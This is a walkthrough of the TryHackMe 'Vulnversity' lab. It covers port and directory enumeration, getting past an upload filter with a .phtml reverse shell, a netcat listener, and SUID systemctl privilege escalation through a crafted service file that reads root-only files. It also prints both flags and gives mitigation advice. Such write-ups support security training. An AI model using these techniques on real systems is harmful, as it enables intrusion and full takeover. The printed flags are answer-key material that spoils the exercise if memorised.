# TryHackMe: Vulnversity — Penetration Testing Walkthrough
Room: Vulnversity
Target IP: ```10.49.178.151```
OS: Linux (Ubuntu)
Vector: Arbitrary File Upload via File Extension Bypass $\rightarrow$ SUID Binary Privilege Escalation (```systemctl```)

## 1. Executive Summary
The Vulnversity machine involves discovering open services on a target server, bypassing web upload restrictions to achieve Initial Access via a reverse shell, and escalating privileges to ```root``` using an misconfigured SUID binary (```/bin/systemctl```).

## 2. Reconnaissance & Enumeration
Network Scanning (Nmap)
An initial port scan using ```nmap``` was executed to discover open ports and service versions.
```bash
nmap -sV -sC -p- 10.49.178.151 -Pn
```
| Open      | Ports Identified:                   |
|:--        |:--                                  |
| Port      | Service,Version / Details           |
| 21/tcp    | FTP,vsftpd 3.0.5                    |
| 22/tcp    | SSH,OpenSSH 8.2p1 Ubuntu            | 
| 139/tcp   | NetBIOS,Samba smbd 4                | 
| 445/tcp   | SMB,Samba smbd 4                    | 
| 3128/tcp  | Squid Proxy,Squid http proxy 4.10   |
| 3333/tcp  | HTTP,Apache httpd 2.4.41 ((Ubuntu)) |

Directory Brute-Forcing (Gobuster)
An HTTP service running on non-standard port ```3333``` was enumerated using ```gobuster``` to discover hidden paths and directories.
```bash
gobuster dir -u http://10.49.178.151:3333 -w /usr/share/wordlists/dirb/common.txt
```
Discovered Paths:
- ```/images/``` (Status: 301)
- ```/css/``` (Status: 301)
- ```/js/``` (Status: 301)
- ```/internal/``` (Status: 301) $\rightarrow$ Upload form discovered

## 3. Vulnerability Exploitation & Initial Access
File Upload Restriction Bypass
Navigating to ```[http://10.49.178.151:3333/internal/](http://10.49.178.151:3333/internal/)``` revealed a web form allowing file uploads. Standard ```.php``` reverse shell scripts were blocked by extension filtering.
- Bypass Strategy: Testing alternative PHP execution extensions (```.php, .php3, .php4, .php5, .phtml```).
- Successful Extension: ```.phtml``` successfully bypassed the filter.

Reverse Shell Execution
1. Prepared a PHP reverse shell script saved as ```reverse.phtml```.
2. Uploaded ```reverse.phtml``` via the ```/internal/``` upload form.
3. Verified the uploaded shell location under ```[http://10.49.178.151:3333/internal/uploads/reverse.phtml](http://10.49.178.151:3333/internal/uploads/reverse.phtml)```.
4. Set up a local Netcat listener on the attack machine:
```bash
nc -lvnp 4444
```
5 . Executed ```reverse.phtml``` in the browser to trigger the reverse shell connection as ```www-data```.

## 4. Post-Exploitation & Shell Stabilization
Spawning an Interactive TTY Shell
Once connected, spawned a fully functional interactive shell using Python:
```bash
python -c 'import pty;pty.spawn("/bin/bash")'
```
User Flag Discovery
Navigated to the user home directories to identify registered users and locate the user flag:
```bash
cd /home/bill
cat user.txt
```
- User Flag: ```8bd7992fbe8a6ad22a63361004cfcedb```

## 5. Privilege Escalation
SUID Binary Enumeration
Searched the system for binaries with the SUID bit set (```-perm -4000```) owned by ```root```:
```bash
find / -user root -perm -4000 2>/dev/null
```
Key Finding: ```/bin/systemctl``` was discovered with SUID permissions enabled.

Exploiting systemctl (SUID)
Since ```/bin/systemctl``` has the SUID bit set, systemd custom service files can be registered and run with root privileges.
1. Created a Temporary Service Configuration:
```bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
[Install]
WantedBy=multi-user.target' > $TF
```
2. Linked and Executed the Service:
```bash
/bin/systemctl link $TF
/bin/systemctl enable --now $TF
```
3. Retrieved the Root Flag:
```bash
cat /tmp/output
```
- Root Flag: ```a58ff8579f0a9270368d33a9966c7fd5```

## 6. Key Takeaways & Mitigation Measures
- Validate Upload Extensions Server-Side: Check file contents (magic bytes/MIME types) and strictly whitelist allowed extensions rather than relying on blacklisting specific extensions like ```.php```.
- Audit SUID Binaries: Remove unnecessary SUID permissions from core system management binaries like ```/bin/systemctl``` (```chmod u-s /bin/systemctl```).
